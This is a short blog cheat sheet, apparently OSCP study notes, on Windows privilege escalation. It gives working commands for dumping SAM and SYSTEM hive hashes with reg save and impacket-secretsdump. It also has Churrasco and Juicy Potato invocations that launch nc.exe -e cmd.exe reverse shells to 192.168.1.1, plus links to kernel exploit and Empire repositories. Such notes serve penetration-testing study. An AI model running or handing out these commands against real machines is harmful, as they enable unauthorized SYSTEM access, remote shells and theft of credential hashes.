---
title: Windows Privilege Escalation
author: linatl
date: "2021-03-13 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Tricks to improve a crappy shell
```
rlwrap
> rlwrap -r nc -nvlp 443
```

###### Hashdump
```
Dumping SAM hashes from CMD:
https://miloserdov.org/?p=4129

reg save hklm\sam c:\sam
reg save hklm\system c:\system

Location:
C:/Windows/System32/config/SAM
C:/Windows/System32/config/SYSTEM

Dumping hashes from attack machine:
impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
```

###### Token Kidnapping on Windows Server 2003
https://github.com/Re4son/Churrasco
```
If SeImpersonatePrivilege is Enabled, this will probably work.

> git clone https://github.com/Re4son/Churrasco
after uploading the exe:

Execute Command
> churrasco.exe -d "whoami"
Using nc.exe to start a reverse shell connection
> churrasco.exe -d "c:\Users\username\Documents\nc.exe -e cmd.exe 192.168.1.1 443"
```

###### Potato attacks
```
If both SeChangeNotifyPrivilege and SeImpersonatePrivilege are enabled

Hot Potato
https://foxglovesecurity.com/2016/01/16/hot-potato/

Rotten Potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/rottenpotato

Juicy Potato
https://github.com/ohpe/juicy-potato
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
x86 variant:
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2

Example juicy potato:

List of CLSID's:
http://ohpe.it/juicy-potato/CLSID/

On attacker system:
> nc -nvlp 80
On target system:
First upload nc.exe & JuicyPotato.exe, and place it in current dir
> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
Or using a different CLSID:
> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
```

###### Port Forwarding
///TODO


###### Windows kernel Exploits
```
Seclists
https://github.com/SecWiki/windows-kernel-exploits

Empire
https://github.com/EmpireProject/Empire/tree/master/data/module_source
```
